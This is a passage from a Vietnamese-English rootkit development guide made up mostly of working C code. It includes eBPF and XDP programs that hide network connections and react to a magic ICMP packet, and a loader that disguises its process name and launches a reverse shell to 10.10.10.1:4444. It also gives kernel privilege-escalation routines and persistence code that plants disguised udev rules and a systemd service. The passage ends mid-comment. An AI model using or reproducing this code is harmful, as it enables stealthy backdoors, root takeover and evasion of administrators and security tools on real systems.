    e->pid = bpf_get_current_pid_tgid() >> 32;  /* PID = upper 32 bits */
    e->uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;  /* UID = lower 32 */
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    /* Read filename (arg1 của execve) từ userspace.
     * ctx->args[0] = pointer tới filename string trong userspace. */
    bpf_probe_read_user_str(e->filename, sizeof(e->filename),
                             (void *)ctx->args[0]);

    bpf_ringbuf_submit(e, 0);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 3: XDP — Network packet filtering
 *
 * Attach: XDP hook trên network interface
 *
 * XDP = eXpress Data Path. Hook tại NIC driver level.
 * TRƯỚC Netfilter, TRƯỚC tc, TRƯỚC socket layer.
 * TRƯỚC tcpdump (nếu dùng AF_PACKET sau XDP).
 *
 * Ưu điểm cho rootkit:
 *   - Fastest possible network hook
 *   - Packets bị drop/modify TRƯỚC mọi monitoring tool
 *   - Legitimate use case (DDoS protection) → hard to distinguish
 *
 * XDP actions:
 *   XDP_PASS:     pass packet to kernel network stack (normal)
 *   XDP_DROP:     drop packet at NIC — BEFORE any kernel processing
 *   XDP_TX:       bounce packet back out same NIC
 *   XDP_REDIRECT: send packet to different NIC/CPU
 *   XDP_ABORTED:  error, drop and notify
 * ══════════════════════════════════════════════════════════════ */

#define MAGIC_VALUE 0xDEAD1337
#define ETH_P_IP    0x0800

SEC("xdp")
int xdp_filter(struct xdp_md *ctx)
{
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    /* ── Parse Ethernet header ── */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;
    if (eth->h_proto != __bpf_htons(ETH_P_IP))
        return XDP_PASS;

    /* ── Parse IP header ── */
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    /* ── ICMP magic packet check ── */
    if (ip->protocol == IPPROTO_ICMP) {
        struct icmphdr *icmp = (void *)ip + (ip->ihl * 4);
        if ((void *)(icmp + 1) > data_end)
            return XDP_PASS;

        if (icmp->type == 8) {  /* Echo Request */
            void *payload = (void *)(icmp + 1);
            if (payload + 4 > data_end)
                return XDP_PASS;

            __u32 magic = *(__u32 *)payload;
            if (magic == __bpf_htonl(MAGIC_VALUE)) {
                /* Magic packet detected!
                 * Send event tới userspace cho handling.
                 * XDP_DROP: packet never reaches kernel stack. */

                struct event *e = bpf_ringbuf_reserve(&events,
                                                       sizeof(*e), 0);
                if (e) {
                    e->type = 3;  /* magic packet event */
                    e->pid = 0;
                    __builtin_memcpy(&e->comm, "xdp_magic", 10);
                    bpf_ringbuf_submit(e, 0);
                }

                return XDP_DROP;
            }
        }
    }

    /* ── TCP hidden port check ── */
    if (ip->protocol == IPPROTO_TCP) {
        struct tcphdr *tcp = (void *)ip + (ip->ihl * 4);
        if ((void *)(tcp + 1) > data_end)
            return XDP_PASS;

        __u16 dport = __bpf_ntohs(tcp->dest);
        __u16 sport = __bpf_ntohs(tcp->source);

        /* Optional: drop packets TO hidden port from external
         * scanners. Cho phép packets FROM hidden port (response). */
    }

    return XDP_PASS;
}

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 4: Network connection hiding via /proc/net/tcp hook
 *
 * Attach: kprobe trên tcp4_seq_show
 *
 * Dùng bpf_override_return để skip output khi tcp4_seq_show
 * chuẩn bị output connection trên hidden port.
 *
 * Requirements:
 *   CONFIG_BPF_KPROBE_OVERRIDE=y
 *   tcp4_seq_show annotated with ALLOW_ERROR_INJECTION (kernel 5.7+)
 *   Program type = kprobe (NOT fentry — fentry KHÔNG support
 *   bpf_override_return)
 * ══════════════════════════════════════════════════════════════ */

SEC("kprobe/tcp4_seq_show")
int hide_tcp_kprobe(struct pt_regs *ctx)
{
    struct seq_file *seq;
    void *v;
    struct sock *sk;
    struct inet_sock *inet;
    __u16 sport, dport;

    /* arg1 = seq_file *, arg2 = void *v */
    seq = (struct seq_file *)PT_REGS_PARM1(ctx);
    v = (void *)PT_REGS_PARM2(ctx);

    if (v == (void *)1) return 0;  /* SEQ_START_TOKEN */

    sk = (struct sock *)v;
    inet = (struct inet_sock *)sk;
    sport = BPF_CORE_READ(inet, inet_sport);
    dport = BPF_CORE_READ(sk, __sk_common.skc_dport);
    sport = __bpf_ntohs(sport);
    dport = __bpf_ntohs(dport);

    if (sport == HIDDEN_PORT || dport == HIDDEN_PORT) {
        /* bpf_override_return: make tcp4_seq_show return
         * SEQ_SKIP (1) → seq_file skips this entry's output.
         *
         * Requirements:
         *   CONFIG_BPF_KPROBE_OVERRIDE=y
         *   tcp4_seq_show annotated with ALLOW_ERROR_INJECTION
         *   Program type = kprobe (NOT fentry)
         */
        bpf_override_return(ctx, 1);  /* SEQ_SKIP */
        return 0;
    }

    return 0;
}
```

### 10.3 Userspace loader (rk_loader.c)

```c
/* rk_loader.c — eBPF rootkit userspace loader
 *
 * Compile: gcc -Wall -O2 -o rk_loader rk_loader.c -lbpf -lelf -lz
 * Run:     sudo ./rk_loader
 *
 * Loader responsibilities:
 *   1. Load eBPF programs vào kernel
 *   2. Attach programs tới hook points
 *   3. Pin programs (persistence)
 *   4. Read events từ ring buffer
 *   5. Handle magic packet commands
 *   6. Manage hidden PID list
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "rk.skel.h"

static volatile bool running = true;
static void sig_handler(int sig) { running = false; }

/* Event callback — handle events từ kernel eBPF programs */
static int handle_event(void *ctx, void *data, size_t data_sz)
{
    struct event {
        __u32 pid;
        __u32 uid;
        __u8  type;
        char  comm[16];
        char  filename[256];
    } *e = data;

    switch (e->type) {
    case 1:  /* exec event */
        /* Log hoặc forward tới C2 */
        fprintf(stderr, "[exec] pid=%d uid=%d comm=%s file=%s\n",
                e->pid, e->uid, e->comm, e->filename);
        break;

    case 3:  /* magic packet */
        fprintf(stderr, "[!] Magic packet received!\n");
        /* Trigger backdoor action */
        system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1 &'");
        break;
    }

    return 0;
}

int main(int argc, char **argv)
{
    struct rk_bpf *skel;
    struct ring_buffer *rb = NULL;
    int err;

    /* Raise RLIMIT_MEMLOCK cho BPF maps.
     * eBPF maps dùng locked memory — default limit quá nhỏ. */
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    /* ── Step 1: Open + Load eBPF programs ──
     *
     * xxx__open_and_load():
     *   1. Parse ELF file (rk.bpf.o embedded trong skeleton)
     *   2. Create BPF maps in kernel
     *   3. Relocate programs (fix up map references)
     *   4. Load programs via bpf() syscall
     *   5. Verifier checks each program (can fail here)
     */
    skel = rk_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open/load BPF skeleton\n");
        return 1;
    }
    fprintf(stderr, "BPF programs loaded\n");

    /* ── Step 2: Attach programs tới hook points ──
     *
     * xxx__attach():
     *   Mỗi program attach theo SEC() type:
     *   - "tracepoint/..." → attach_tracepoint()
     *   - "kprobe/..."     → attach_kprobe()
     *   - "xdp"            → attach_xdp() (needs interface)
     *   - "fentry/..."     → attach_fentry()
     */
    err = rk_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach: %d\n", err);
        goto cleanup;
    }
    fprintf(stderr, "BPF programs attached\n");

    /* ── Step 3: Pin programs cho persistence ──
     *
     * BPF filesystem (/sys/fs/bpf/) cho phép pin programs+maps.
     * Pinned objects persist ngay cả khi loader process exit.
     * → eBPF rootkit tiếp tục chạy sau khi loader thoát.
     *
     * Để remove: rm /sys/fs/bpf/rk/* hoặc bpftool prog detach
     */
    err = bpf_object__pin(skel->obj, "/sys/fs/bpf/rk");
    if (err && err != -EEXIST) {
        fprintf(stderr, "Failed to pin: %d (non-fatal)\n", err);
        /* Non-fatal: programs still work, just no persistence */
    }

    /* ── Step 4: Setup ring buffer reader ── */
    rb = ring_buffer__new(bpf_map__fd(skel->maps.events),
                           handle_event, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    /* ── Step 5: Daemonize ──
     * Detach từ terminal, chạy background.
     * Process name disguise: overwrite argv. */
    if (argc <= 1 || strcmp(argv[1], "--foreground") != 0) {
        daemon(0, 0);
        /* Overwrite process name */
        memset(argv[0], 0, strlen(argv[0]));
        strcpy(argv[0], "[kworker/0:2]");
    }

    fprintf(stderr, "eBPF rootkit active. PID=%d\n", getpid());

    /* ── Step 6: Event loop ── */
    while (running) {
        err = ring_buffer__poll(rb, 100 /* timeout ms */);
        if (err == -EINTR)
            break;
        if (err < 0) {
            fprintf(stderr, "ring_buffer__poll error: %d\n", err);
            break;
        }
    }

cleanup:
    ring_buffer__free(rb);
    rk_bpf__destroy(skel);
    return 0;
}
```

---

## Chapter 11: Privilege Escalation

### 11.0 Linux Credential Model — Hieu uid/gid/capabilities

Privilege escalation trong kernel rootkit la qua trinh thay doi credential structures cua process hien tai de co quyen root. Hieu credential model cua Linux la nen tang de hieu tai sao privesc tu kernel space lai "trivial".

#### 11.0.1 UID Types — Moi process co 4 bo UID

Moi process trong Linux co 4 loai UID (va tuong tu 4 loai GID), moi loai phuc vu muc dich khac nhau:

```
Credential Types trong struct cred (include/linux/cred.h):

  ┌─────────────────┬──────────────────────────────────────────────┐
  │ real uid (ruid)  │ Ai SO HUU process nay.                     │
  │                  │ Set tai fork() time, ke thua tu parent.     │
  │                  │ Chi root moi thay doi duoc (setuid()).       │
  ├─────────────────┼──────────────────────────────────────────────┤
  │ effective uid    │ Dung cho MOI permission check.              │
  │ (euid)           │ Khi process mo file, gui signal, etc.       │
  │                  │ setuid binary thay doi euid (khong phai     │
  │                  │ ruid) de tam thoi co quyen.                 │
  ├─────────────────┼──────────────────────────────────────────────┤
  │ saved uid (suid) │ Luu gia tri euid truoc khi thay doi.       │
  │                  │ Cho phep seteuid() restore ve gia tri cu.   │
  │                  │ Vi du: program drop privileges tam thoi     │
  │                  │ roi restore lai khi can.                    │
  ├─────────────────┼──────────────────────────────────────────────┤
  │ filesystem uid   │ Dung RIENG cho file access checks.         │
  │ (fsuid)          │ Thuong = euid (Linux-specific, rare case    │
  │                  │ can set khac: NFS server impersonation).    │
  └─────────────────┴──────────────────────────────────────────────┘

  Setuid binary flow (vi du: /usr/bin/passwd):
  ┌──────────────────────────────────────────────────────────────┐
  │ User "alice" (uid=1000) chay /usr/bin/passwd (owned by root)│
  │                                                              │
  │ Truoc execve:  ruid=1000, euid=1000, suid=1000              │
  │ Sau execve:    ruid=1000, euid=0,    suid=0                 │
  │                           ^^^^                               │
  │              euid = 0 (root) vi file co setuid bit           │
  │              → passwd co quyen write /etc/shadow             │
  └──────────────────────────────────────────────────────────────┘
```

#### 11.0.2 struct cred — Credential structure trong kernel

```
struct cred (kernel/cred.c):
  ┌──────────────────────────────────────────────────────────┐
  │ atomic_t usage          (reference count)                │
  │ kuid_t uid, euid, suid, fsuid    (4 UIDs)               │
  │ kgid_t gid, egid, sgid, fsgid    (4 GIDs)               │
  │ kernel_cap_t cap_effective        (effective capabilities)│
  │ kernel_cap_t cap_permitted        (permitted capabilities)│
  │ kernel_cap_t cap_inheritable      (inheritable caps)     │
  │ kernel_cap_t cap_bset             (bounding set)         │
  │ kernel_cap_t cap_ambient          (ambient caps)         │
  │ struct user_struct *user          (user accounting)      │
  │ struct user_namespace *user_ns    (user namespace)       │
  │ struct group_info *group_info     (supplementary groups) │
  │ void *security                    (LSM security blob)    │
  └──────────────────────────────────────────────────────────┘

  QUAN TRONG: struct cred duoc quan ly boi RCU (Read-Copy-Update).
  Kernel KHONG sua truc tiep current->cred.
  Thay vao do, no copy → modify copy → swap atomically.
```

#### 11.0.3 Privilege Escalation Flow — prepare_kernel_cred + commit_creds

```
  prepare_kernel_cred(NULL)     ← DEPRECATED tu kernel 5.17!
    │
    │  1. Allocates new struct cred (kmalloc)
    │  2. Tham so NULL → copy tu init_cred (kernel/cred.c)
    │     init_cred = {
    │       uid = 0, gid = 0           (root)
    │       cap_effective   = FULL     (all 41 capabilities)
    │       cap_permitted   = FULL
    │       cap_inheritable = EMPTY    (khong FULL!)
    │       cap_bset        = FULL
    │       cap_ambient     = EMPTY    (khong FULL!)
    │     }
    │  3. Return new_cred voi uid=0, gid=0
    │
    │  ⚠ KERNEL 5.17+: emits deprecation warning
    │  ⚠ KERNEL 6.2+:  prepare_kernel_cred(NULL) RETURNS NULL!
    │     → commit_creds(NULL) → KERNEL PANIC
    │
    │  MODERN APPROACH (kernel 6.2+):
    │     struct cred *new = prepare_kernel_cred(current);
    │     if (!new) return;
    │     new->uid = new->euid = new->suid = new->fsuid = GLOBAL_ROOT_UID;
    │     new->gid = new->egid = new->sgid = new->fsgid = GLOBAL_ROOT_GID;
    │     new->cap_effective   = CAP_FULL_SET;
    │     new->cap_permitted   = CAP_FULL_SET;
    │     new->cap_inheritable = CAP_FULL_SET;
    │     new->cap_bset        = CAP_FULL_SET;
    │     commit_creds(new);
    │
    │  ALTERNATIVE: commit_creds(prepare_kernel_cred(&init_task))
    │     (init_task luon ton tai, equivalent cu prepare_kernel_cred(NULL))
    │
    ▼
  commit_creds(new_cred)
    │
    │  1. rcu_assign_pointer(current->cred, new_cred)
    │     → Atomic swap, readers (permission checks) thay new cred
    │  2. old_cred duoc scheduled cho RCU free
    │     → Sau grace period, kfree(old_cred)
    │  3. Process la ROOT ngay lap tuc
    │
    ▼
  Process now has uid=0, full capabilities

  CANH BAO voi prepare_kernel_cred:
  ┌──────────────────────────────────────────────────────────┐
  │ Kernel < 5.17:  prepare_kernel_cred(NULL) = OK           │
  │ Kernel 5.17-6.1: NULL → warning + works                  │
  │ Kernel 6.2+:    NULL → RETURNS NULL → PANIC!             │
  │                                                          │
  │ PORTABLE: prepare_kernel_cred(&init_task)                │
  │ hoac:     prepare_kernel_cred(current) + manual set uid  │
  │                                                          │
  │ LUON CHECK: if (!new_cred) return;                       │
  └──────────────────────────────────────────────────────────┘
```

#### 11.0.4 Linux Capabilities — Fine-grained privileges

Linux capabilities chia nho "root power" thanh 41 capabilities rieng biet. Moi capability kiem soat mot nhom operations cu the:

```
Capability              Gia tri   Mo ta
─────────────────────────────────────────────────────────────────
CAP_SYS_ADMIN           21        "God mode" — catch-all admin
                                  capability. mount, swapon,
                                  quotactl, sethostname, etc.
                                  BPF program load can cap nay.

CAP_NET_RAW             13        Su dung raw sockets va packet
                                  sockets. Can cho ICMP (ping),
                                  network sniffing.

CAP_SYS_MODULE          16        Load va unload kernel modules.
                                  insmod, rmmod, init_module().
                                  Rootkit can cap nay de tu load.

CAP_SYS_PTRACE          19        Trace BAT KY process nao
                                  (khong chi child). Doc/ghi
                                  memory cua process khac.

CAP_DAC_OVERRIDE         1        Bypass ALL file permission
                                  checks (read, write, execute).
                                  Tuong duong "ignore rwx bits".

CAP_NET_ADMIN            12       Network configuration: ifconfig,
                                  route, iptables, socket options.

CAP_SETUID               7        Thay doi process UIDs (setuid,
                                  setreuid, setresuid).

CAP_SYS_RAWIO            17       Raw I/O port access (iopl,
                                  ioperm). Direct hardware access.

  Capability sets per process:
  ┌──────────────────────────────────────────────────────────┐
  │ Effective   = dang duoc su dung cho permission checks    │
  │ Permitted   = cap upper bound — effective <= permitted   │
  │ Inheritable = duoc ke thua qua execve()                  │
  │ Bounding    = limit cho cap co the gain qua execve()     │
  │ Ambient     = auto-raise vao effective sau execve()      │
  │               (khong can setuid binary)                  │
  └──────────────────────────────────────────────────────────┘
```

---

```c
/* privesc.c — Tất cả phương pháp escalate privilege từ kernel
 *
 * Khi đã có code execution trong kernel (Ring 0),
 * privilege escalation trở thành trivial:
 * ta có quyền TRỰC TIẾP modify credential structures.
 *
 * 3 phương pháp chính:
 */

#include "rootkit.h"

/* ═══════════════════════════════════════
 * METHOD 1: prepare_creds + commit_creds (RECOMMENDED)
 * 
 * Dùng kernel API chính thức.
 * An toàn nhất, handle locking + RCU đúng.
 * ═══════════════════════════════════════ */
static void privesc_api(void)
{
    struct cred *new = prepare_creds();
    if (!new) return;

    new->uid  = new->euid  = new->suid  = new->fsuid  = GLOBAL_ROOT_UID;
    new->gid  = new->egid  = new->sgid  = new->fsgid  = GLOBAL_ROOT_GID;
    new->cap_effective   = CAP_FULL_SET;
    new->cap_permitted   = CAP_FULL_SET;
    new->cap_inheritable = CAP_FULL_SET;
    new->cap_bset        = CAP_FULL_SET;
    new->cap_ambient     = CAP_FULL_SET;

    commit_creds(new);
}

/* ═══════════════════════════════════════
 * METHOD 2: prepare_kernel_cred(NULL) — One-liner
 *
 * prepare_kernel_cred(NULL) tạo credential set giống init process:
 *   uid=0, gid=0, full capabilities
 *
 * Simplest possible privesc.
 * Common trong kernel exploits (stack overflow → ROP → this).
 *
 * QUAN TRỌNG: phải check NULL return.
 * Nếu kmalloc fail → prepare_kernel_cred returns NULL
 * → commit_creds(NULL) → NULL dereference → kernel panic.
 * ═══════════════════════════════════════ */
static void privesc_kernel_cred(void)
{
    struct cred *new;

    new = prepare_kernel_cred(NULL);
    if (!new) {
        pr_warn("rk: prepare_kernel_cred failed\n");
        return;
    }
    commit_creds(new);
}

/* ═══════════════════════════════════════
 * METHOD 3: Direct memory write (DKOM approach)
 *
 * Bypass API hoàn toàn. Không trigger audit hooks.
 * Nhưng violates kernel invariants.
 * ═══════════════════════════════════════ */
static void privesc_dkom(void)
{
    struct cred *cred = (struct cred *)current->cred;

    /* Direct write — no locking, no audit, no RCU */
    *(kuid_t *)&cred->uid  = GLOBAL_ROOT_UID;
    *(kuid_t *)&cred->euid = GLOBAL_ROOT_UID;
    *(kgid_t *)&cred->gid  = GLOBAL_ROOT_GID;
    *(kgid_t *)&cred->egid = GLOBAL_ROOT_GID;
    cred->cap_effective = CAP_FULL_SET;
    cred->cap_permitted = CAP_FULL_SET;

    /* Bypass SELinux/AppArmor:
     * security field trong cred chứa LSM-specific data.
     * Setting NULL hoặc init_cred's security = bypass MAC. */
}
```

---

---

# Part III — Operations & Infrastructure

## Chapter 12: Persistence

### 12.0 Linux Boot Process — Tu power-on toi rootkit load

De hieu persistence mechanisms, truoc tien phai hieu Linux boot process — chuoi cac buoc tu luc nhan nut nguon toi khi rootkit module duoc load vao kernel.

#### 12.0.1 Boot Sequence — Complete timeline

```
  ┌─────────────────────────────────────────────────────────────────┐
  │                     FIRMWARE PHASE                              │
  ├─────────────────────────────────────────────────────────────────┤
  │                                                                 │
  │  Power On                                                       │
  │     │                                                           │
  │     ▼                                                           │
  │  BIOS/UEFI POST (Power-On Self Test)                           │
  │     │  - Hardware initialization                                │
  │     │  - Memory detection                                       │
  │     │  - Boot device enumeration                                │
  │     ▼                                                           │
  │  Boot Device Selection                                          │
  │     │  BIOS: MBR (sector 0, 512 bytes)                         │
  │     │  UEFI: ESP (EFI System Partition, FAT32)                 │
  │     ▼                                                           │
  ├─────────────────────────────────────────────────────────────────┤
  │                    BOOTLOADER PHASE                              │
  ├─────────────────────────────────────────────────────────────────┤
  │                                                                 │
  │  GRUB / systemd-boot / rEFInd                                  │
  │     │  1. Load vmlinuz (compressed kernel image)               │
  │     │  2. Load initramfs (initial RAM filesystem)              │
  │     │  3. Pass kernel command line parameters                  │
  │     │  4. Jump to kernel entry point                           │
  │     ▼                                                           │
  ├─────────────────────────────────────────────────────────────────┤
  │                     KERNEL PHASE                                │
  ├─────────────────────────────────────────────────────────────────┤
  │                                                                 │
  │  startup_64 (arch/x86/boot/compressed/head_64.S)              │
  │     │  - Kernel decompresses itself                            │
  │     ▼                                                           │
  │  start_kernel() (init/main.c)                                  │
  │     │                                                           │
  │     ├── setup_arch()           Architecture-specific setup     │
  │     ├── mm_init()              Memory management init          │
  │     ├── sched_init()           Scheduler init                  │
  │     ├── early_irq_init()       Interrupt init                  │
  │     ├── init_timers()          Timer subsystem                 │
  │     ├── console_init()         Console output                  │
  │     │                                                           │
  │     └── rest_init()                                            │
  │          │                                                      │
  │          └── kernel_init() [kernel thread, PID 1]              │
  │               │                                                 │
  │               ├── kernel_init_freeable()                       │
  │               │    │                                            │
  │               │    ├── do_initcalls()                           │
  │               │    │   │                                        │
  │               │    │   │  Goi TAT CA built-in module init()    │
  │               │    │   │  Theo thu tu priority levels:          │
  │               │    │   │  0: early/pure  3: arch    6: device  │
  │               │    │   │  1: core        4: subsys  7: late    │
  │               │    │   │  2: postcore    5: fs                 │
  │               │    │   │                                        │
  │               │    │   └── ← BUILT-IN modules init here        │
  │               │    │                                            │
  │               │    └── prepare_namespace()                     │
  │               │         │                                       │
  │               │         └── Mount REAL root filesystem          │
  │               │              (switch tu initramfs)              │
  │               │                                                 │
  │               └── run_init_process("/sbin/init") ← PID 1      │
  │                                                                 │
  ├─────────────────────────────────────────────────────────────────┤
  │                    USERSPACE PHASE (systemd)                    │
  ├─────────────────────────────────────────────────────────────────┤
  │                                                                 │
  │  systemd (PID 1)                                                │
  │     │                                                           │
  │     ├── Read /etc/modules-load.d/*.conf                        │
  │     │   └── ← ROOTKIT PERSISTENCE POINT 1                     │
  │     │        systemd-modules-load.service modprobe modules     │
  │     │                                                           │
  │     ├── Process udev rules (/etc/udev/rules.d/)               │
  │     │   └── ← ROOTKIT PERSISTENCE POINT 2                     │
  │     │        udev rule triggers modprobe on device event       │
  │     │                                                           │
  │     ├── Start systemd services                                 │
  │     │   └── ← ROOTKIT PERSISTENCE POINT 3                     │
  │     │        Custom .service file runs modprobe                │
  │     │                                                           │
  │     └── Multi-user target reached (login prompt)               │
  │                                                                 │
  └─────────────────────────────────────────────────────────────────┘
```

#### 12.0.2 Module Autoloading Mechanism

Kernel modules co the duoc load tu dong thong qua nhieu co che. Hieu cac co che nay giup rootkit chon diem persistence phu hop:

```
  Module Request Flow:

  Something triggers module request
  (vi du: mount filesystem, open device, network protocol)
        │
        ▼
  request_module("module_name")          (kernel/kmod.c)
        │
        ▼
  call_modprobe()
        │
        ▼
  call_usermodehelper("/sbin/modprobe", argv, envp, UMH_WAIT_PROC)
        │
        │  Kernel spawns userspace process!
        │  Process chay voi uid=0 (root)
        ▼
  /sbin/modprobe "module_name"
        │
        ├── Doc /etc/modprobe.d/*.conf
        │   │
        │   ├── Check "install" directives
        │   │   └── ← ROOTKIT PERSISTENCE POINT (parasitic)
        │   │        "install e1000 insmod rootkit.ko; modprobe ..."
        │   │
        │   ├── Check "alias" directives
        │   │   └── Map alias → real module name
        │   │
        │   └── Check "options" directives
        │       └── Default module parameters
        │
        ├── Doc /lib/modules/$(uname -r)/modules.dep
        │   │
        │   │  modules.dep = dependency graph
        │   │  Generated by depmod -a
        │   │  Format: module.ko: dep1.ko dep2.ko
        │   │
        │   └── Load dependencies TRUOC, roi load target module
        │
        └── init_module() syscall (hoac finit_module)
            │
            └── Kernel loads .ko file → calls module_init()

  depmod va modules.dep:
  ┌──────────────────────────────────────────────────────┐
  │ depmod -a                                            │
  │   Scan /lib/modules/$(uname -r)/                    │
  │   Build modules.dep (dependency map)                 │
  │   Build modules.alias (device → module mapping)      │
  │   Build modules.symbols (exported symbols)           │
  │                                                      │
  │ Rootkit PHAI chay depmod sau khi copy .ko vao        │
  │ /lib/modules/ de modprobe tim thay no.               │
  └──────────────────────────────────────────────────────┘
```

#### 12.0.3 initramfs — Early boot rootkit loading

```
  initramfs (Initial RAM Filesystem):
  ┌────────────────────────────────────────────────────────────┐
  │ - CPIO archive (khong phai filesystem image)              │
  │ - Duoc load vao RAM boi bootloader (GRUB)                 │
  │ - Mount nhu tmpfs (in-memory filesystem)                  │
  │ - Chua essential drivers + scripts cho early boot         │
  │ - Can thiet khi root filesystem tren LVM, RAID, NFS,     │
  │   encrypted disk, etc.                                    │
  │                                                            │
  │ Generated by:                                              │
  │   Debian/Ubuntu: update-initramfs / mkinitramfs            │
  │   RHEL/Fedora:   dracut                                    │
  │   Arch:          mkinitcpio                                │
  │                                                            │
  │ Location: /boot/initramfs-$(uname -r).img                 │
  │           /boot/initrd.img-$(uname -r)                    │
  └────────────────────────────────────────────────────────────┘

  Rootkit trong initramfs:
  ┌──────────────────────────────────────────────────────────────┐
  │ Uu diem:                                                     │
  │   - Load TRUOC real rootfs mount                             │
  │   - Load TRUOC bat ky security tool nao                      │
  │   - initramfs it khi bi inspect boi admins                   │
  │   - Survive rootfs integrity checks (vi rootkit khong        │
  │     nam tren rootfs luc check)                               │
  │                                                              │
  │ Nhuoc diem:                                                  │
  │   - Phai rebuild initramfs (can root access)                 │
  │   - Kernel update co the overwrite initramfs                 │
  │     (giai phap: hook update-initramfs command)               │
  │   - Secure Boot co the verify initramfs signature            │
  └──────────────────────────────────────────────────────────────┘
```

---

```c
/* persistence.c — 7 phương pháp persist rootkit qua reboot
 *
 * Kernel module chỉ sống trong RAM → reboot = mất.
 * Persistence mechanism đảm bảo module auto-load sau reboot.
 *
 * Mỗi phương pháp có trade-off stealth vs reliability.
 * APT thường dùng NHIỀU layers (defense in depth cho persistence).
 */

#include "rootkit.h"
#include <linux/kmod.h>

/* ══════════════════════════════════════════════════════════════
 * METHOD 1: /etc/modules-load.d/ — Systemd auto-load
 *
 * Stealth: LOW (admin check file → thấy ngay)
 * Reliability: HIGH (systemd guaranteed)
 *
 * Tạo file /etc/modules-load.d/MODULE.conf chứa module name.
 * systemd-modules-load.service đọc file này khi boot.
 * ══════════════════════════════════════════════════════════════ */
static void persist_modules_load_d(const char *module_name,
                                    const char *ko_path)
{
    char cmd[1024];

    /* Copy .ko vào standard module directory */
    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko 2>/dev/null; "
        "depmod -a 2>/dev/null; "
        "echo '%s' > /etc/modules-load.d/%s.conf",
        ko_path, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 2: /etc/modules (legacy) — init system auto-load
 *
 * Stealth: LOW
 * Reliability: HIGH (works on sysvinit, upstart, systemd)
 * ══════════════════════════════════════════════════════════════ */
static void persist_etc_modules(const char *module_name,
                                 const char *ko_path)
{
    char cmd[1024];

    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko 2>/dev/null; "
        "depmod -a 2>/dev/null; "
        /* Append module name nếu chưa có */
        "grep -qxF '%s' /etc/modules || echo '%s' >> /etc/modules",
        ko_path, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 3: Udev rule — Load khi hardware event
 *
 * Stealth: MEDIUM (udev rules ít ai check manually)
 * Reliability: HIGH (udev luôn chạy)
 *
 * Udev rule trigger khi kernel detect hardware.
 * "Add any device" → load module.
 * Disguise: đặt tên rule giống legitimate module.
 * ══════════════════════════════════════════════════════════════ */
static void persist_udev_rule(const char *module_name,
                               const char *ko_path)
{
    char cmd[1024];

    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko 2>/dev/null; "
        "depmod -a; "
        /* Rule disguised as audio driver loader */
        "echo 'ACTION==\"add\", "
        "SUBSYSTEM==\"module\", "
        "RUN+=\"/sbin/modprobe %s\"' "
        "> /etc/udev/rules.d/99-audio-firmware.rules; "
        "udevadm control --reload-rules",
        ko_path, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 4: Systemd service — Maximum control
 *
 * Stealth: MEDIUM (service ẩn nếu rootkit hide file)
 * Reliability: HIGH (systemd restart on failure)
 *
 * Tạo systemd service file → auto-start, auto-restart.
 * After rootkit load → rootkit ẩn service file via getdents64 hook.
 * ══════════════════════════════════════════════════════════════ */
static void persist_systemd_service(const char *module_name,
                                     const char *ko_path)
{
    char cmd[2048];

    /* Service file disguised as firmware helper */
    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "
        "cat > /etc/systemd/system/firmware-helper.service << 'EOF'\n"
        "[Unit]\n"
        "Description=Firmware Helper Service\n"
        "DefaultDependencies=no\n"
        "After=systemd-modules-load.service\n"
        "Before=sysinit.target\n"
        "\n"
        "[Service]\n"
        "Type=oneshot\n"
        "ExecStart=/sbin/modprobe %s\n"
        "RemainAfterExit=yes\n"
        "\n"
        "[Install]\n"
        "WantedBy=sysinit.target\n"
        "EOF\n"
        "systemctl daemon-reload; "
        "systemctl enable firmware-helper.service 2>/dev/null",
        ko_path, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 5: Infect initramfs — Load TRƯỚC root filesystem mount
 *
 * Stealth: HIGH (initramfs ít khi inspected)
 * Reliability: VERY HIGH (runs earliest in boot)
 * Complexity: HIGH (phải rebuild initramfs correctly)
 *
